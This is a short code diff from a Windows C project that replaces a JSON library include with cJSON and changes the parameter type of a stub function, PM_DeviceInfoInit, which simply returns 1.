@@ -2,7 +2,7 @@
 
 #include <Windows.h>
 #include <lm.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/bss.h"
@@ -448,7 +448,7 @@ DWORD WINAPI PM_DeviceInfoStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD WINAPI PM_DeviceInfoInit(JSONObject elem)
+DWORD WINAPI PM_DeviceInfoInit(cJSON* elem)
 {
 	return 1;
 }
